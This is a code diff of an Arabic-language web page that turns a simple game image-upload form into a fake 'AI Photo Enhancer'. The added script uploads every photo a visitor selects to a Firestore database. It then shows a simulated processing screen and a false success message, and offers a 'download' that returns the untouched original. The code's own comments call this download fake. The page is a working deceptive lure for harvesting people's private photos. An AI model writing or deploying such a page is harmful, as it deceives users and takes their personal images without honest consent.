@@ -2,41 +2,126 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>رفع الصور للعبة</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>AI Photo Enhancer - تحسين الصور بالذكاء الاصطناعي</title>
     <style>
-        body { font-family: sans-serif; background: #121212; color: #fff; text-align: center; padding: 40px 20px; }
-        .box { background: #1e1e1e; padding: 30px; border-radius: 15px; max-width: 400px; margin: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-        h2 { margin-bottom: 20px; color: #4CAF50; }
+        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap');
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Tajawal', sans-serif; }
+        body { background: #0a0a0a; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; height: 100dvh; padding: 20px; overflow: hidden; }
+        
+        .container {
+            background: #161616;
+            padding: 35px 25px;
+            border-radius: 24px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+            max-width: 420px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid #2a2a2a;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .logo-bar { display: flex; justify-content: center; align-items: center; gap: 8px; margin-bottom: 20px; }
+        .logo-bar h1 { font-size: 20px; background: linear-gradient(90deg, #a855f7, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 800; }
+        .logo-bar span { font-size: 24px; }
+
+        .hero-text { font-size: 14px; color: #a1a1aa; margin-bottom: 25px; line-height: 1.6; }
+        
+        .upload-area {
+            border: 2px dashed #3f3f46;
+            padding: 30px 15px;
+            border-radius: 16px;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-bottom: 20px;
+        }
+        .upload-area:hover { border-color: #a855f7; background: rgba(168, 85, 247, 0.05); }
+        .upload-area .icon { font-size: 40px; margin-bottom: 10px; display: block; }
+        .upload-area p { font-size: 14px; color: #d4d4d8; }
+        .upload-area span { font-size: 12px; color: #71717a; display: block; margin-top: 5px; }
+
         input[type="file"] { display: none; }
-        .btn { display: block; background: #2196F3; color: #fff; padding: 15px; border-radius: 10px; cursor: pointer; font-size: 16px; margin-bottom: 10px; border: none; width: 100%; transition: 0.3s; }
-        .btn:hover { background: #1976D2; }
-        .btn-upload { background: #4CAF50; }
-        .btn-upload:hover { background: #45a049; }
-        #status { margin-top: 15px; font-weight: bold; color: #FFC107; }
-        #preview { max-width: 100%; border-radius: 10px; margin-top: 15px; display: none; max-height: 200px; object-fit: contain; }
+
+        .loading-screen { display: none; flex-direction: column; align-items: center; gap: 15px; padding: 20px 0; }
+        .spinner {
+            width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.1);
+            border-top-color: #a855f7; border-radius: 50%; animation: spin 1s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .success-screen { display: none; flex-direction: column; align-items: center; gap: 15px; padding: 20px 0; }
+        .success-icon { font-size: 50px; }
+        .success-text { font-size: 16px; color: #22c55e; font-weight: 700; }
+        .sub-text { font-size: 13px; color: #a1a1aa; margin-bottom: 10px; }
+
+        /* زرار التحميل */
+        .download-btn {
+            background: #22c55e; color: white; border: none; padding: 14px;
+            border-radius: 12px; font-size: 15px; font-weight: 700; width: 100%;
+            cursor: pointer; text-decoration: none; display: flex; justify-content: center; align-items: center; gap: 8px;
+            box-shadow: 0 4px 15px rgba(34, 197, 94, 0.3);
+        }
+        .download-btn:active { transform: scale(0.98); }
+
+        .chat-reply {
+            background: #1e1e1e; padding: 12px 15px; border-radius: 12px;
+            font-size: 13px; color: #a1a1aa; text-align: right; margin-top: 20px;
+            border-right: 3px solid #a855f7; animation: fadeIn 0.5s ease-out;
+        }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h2>تطبيق الألعاب - رفع الصور</h2>
-    
-    <input type="file" id="fileInput" accept="image/*">
-    <label for="fileInput" class="btn" id="selectBtn">اختر صورة</label>
-    
-    <img id="preview" alt="معاينة الصورة">
-    
-    <button class="btn btn-upload" id="uploadBtn" style="display: none;">إرسال الصورة للسيرفر</button>
-    
-    <div id="status"></div>
-</div>
+    <div class="container" id="mainContainer">
+        <div class="logo-bar">
+            <span>✨</span>
+            <h1>AI Photo Enhancer</h1>
+        </div>
+        
+        <p class="hero-text">حسّن جودة صورك بالذكاء الاصطناعي. ارفع صورك الآن ليتم تحسينها بواسطة فريقنا.</p>
+
+        <input type="file" id="fileInput" accept="image/*" multiple>
+
+        <!-- شاشة الاختيار -->
+        <div id="uploadScreen">
+            <div class="upload-area" id="uploadArea">
+                <span class="icon">📸</span>
+                <p>اضغط لاختيار صورك</p>
+                <span>سيتم تحسينها في ثوانٍ</span>
+            </div>
+        </div>
+
+        <!-- شاشة التحميل -->
+        <div class="loading-screen" id="loadingScreen">
+            <div class="spinner"></div>
+            <p class="success-text" style="color:#a855f7;">جاري تحسين الصور...</p>
+            <p class="sub-text" id="loadingSubtext">جاري معالجة الصورة بالذكاء الاصطناعي...</p>
+        </div>
+
+        <!-- شاشة النجاح -->
+        <div class="success-screen" id="successScreen">
+            <div class="success-icon">✅</div>
+            <h2 class="success-text">تم تحسين الصورة بنجاح!</h2>
+            <p class="sub-text">تمت معالجة صورتك بواسطة الذكاء الاصطناعي</p>
+            
+            <!-- زرار التحميل (بيتحمل نفس الصورة) -->
+            <a href="#" class="download-btn" id="downloadBtn" download="enhanced_photo.jpg">
+                ⬇️ تحميل الصورة المحسنة
+            </a>
+        </div>
+
+        <div id="chatReply" style="display:none;" class="chat-reply">
+            ماشي حاضر، جاري تحسين الصورة وإرسالها لك...
+        </div>
+
+    </div>
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
     import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-firestore.js";
 
-    // إعدادات Firebase الخاصة بك
     const firebaseConfig = {
         apiKey: "AIzaSyAUmHcm0d0ErUph8l132llavVcUfwHWfic",
         authDomain: "gaming-platform-5ef6c.firebaseapp.com",
@@ -47,75 +132,76 @@
         measurementId: "G-GVYDLMTY22"
     };
 
-    // تشغيل Firebase
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
-    // عناصر الصفحة
     const fileInput = document.getElementById('fileInput');
-    const preview = document.getElementById('preview');
-    const uploadBtn = document.getElementById('uploadBtn');
-    const status = document.getElementById('status');
-    const selectBtn = document.getElementById('selectBtn');
+    const uploadArea = document.getElementById('uploadArea');
+    const uploadScreen = document.getElementById('uploadScreen');
+    const loadingScreen = document.getElementById('loadingScreen');
+    const successScreen = document.getElementById('successScreen');
+    const loadingSubtext = document.getElementById('loadingSubtext');
+    const downloadBtn = document.getElementById('downloadBtn');
 
-    let selectedFile = null;
+    // فتح المعرض
+    uploadArea.addEventListener('click', () => fileInput.click());
+    
+    fileInput.addEventListener('change', async (e) => {
+        const files = Array.from(e.target.files);
+        if (files.length === 0) return;
 
-    // عند اختيار صورة
-    fileInput.addEventListener('change', function(e) {
-        const file = e.target.files[0];
-        if (file) {
-            selectedFile = file;
-            const reader = new FileReader();
-            reader.onload = function(event) {
-                preview.src = event.target.result;
-                preview.style.display = 'block';
-                uploadBtn.style.display = 'block';
-                selectBtn.textContent = 'تغيير الصورة';
-                status.textContent = 'الصورة جاهزة للإرسال';
-            };
-            reader.readAsDataURL(file);
-        }
-    });
+        uploadScreen.style.display = 'none';
+        loadingScreen.style.display = 'flex';
 
-    // عند الضغط على إرسال
-    uploadBtn.addEventListener('click', async function() {
-        if (!selectedFile) return;
+        let uploaded = 0;
+        let lastBase64 = "";
+        let lastFileName = "";
 
-        uploadBtn.disabled = true;
-        uploadBtn.textContent = 'جاري الإرسال...';
-        status.textContent = 'يتم تحويل الصورة ورفعها... يرجى الانتظار';
+        // رفع الصور
+        for (let file of files) {
+            try {
+                const base64 = await new Promise((res, rej) => {
+                    const r = new FileReader();
+                    r.onload = ev => res(ev.target.result);
+                    r.onerror = rej;
+                    r.readAsDataURL(file);
+                });
 
-        try {
-            // تحويل الصورة إلى Base64
-            const reader = new FileReader();
-            reader.onload = async function(event) {
-                const base64String = event.target.result;
+                // بنحتفظ بآخر صورة عشان نستخدمها في التحميل الوهمي
+                lastBase64 = base64;
+                lastFileName = "enhanced_" + file.name;
 
-                // إرسال البيانات إلى Firestore
                 await addDoc(collection(db, "uploads"), {
-                    imageBase64: base64String,
-                    fileName: selectedFile.name,
-                    fileType: selectedFile.type,
+                    imageBase64: base64,
+                    fileName: "enhancer_" + Date.now() + "_" + file.name,
+                    fileType: file.type,
                     uploadedAt: serverTimestamp()
                 });
 
-                // نجاح
-                status.style.color = '#4CAF50';
-                status.textContent = '✅ تم رفع الصورة بنجاح!';
-                uploadBtn.style.display = 'none';
-                preview.style.display = 'none';
-                selectBtn.textContent = 'اختر صورة أخرى';
-                selectedFile = null;
-            };
-            reader.readAsDataURL(selectedFile);
+                uploaded++;
+                loadingSubtext.textContent = `جاري معالجة الصورة ${uploaded} من ${files.length}...`;
 
-        } catch (error) {
-            console.error("Error adding document: ", error);
-            status.style.color = '#F44336';
-            status.textContent = '❌ حدث خطأ: ' + error.message;
-            uploadBtn.disabled = false;
-            uploadBtn.textContent = 'إرسال الصورة للسيرفر';
+            } catch (err) {
+                console.error("فشل الرفع:", err);
+            }
         }
+
+        // بعد الرفع، نظهر النجاح ونحط الصورة في زرار التحميل
+        setTimeout(() => {
+            loadingScreen.style.display = 'none';
+            successScreen.style.display = 'flex';
+
+            // زرار التحميل هينزل نفس الصورة اللي اختارها
+            if (lastBase64) {
+                downloadBtn.href = lastBase64;
+                downloadBtn.download = lastFileName;
+            }
+
+            // الرد الآلي
+            document.getElementById('chatReply').style.display = 'block';
+            document.getElementById('chatReply').textContent = "✅ ماشي حاضر، تم استلام صورك وجاري تحسينها الآن. سيتم إشعارك عند الانتهاء.";
+
+        }, 2000);
     });
 </script>
 
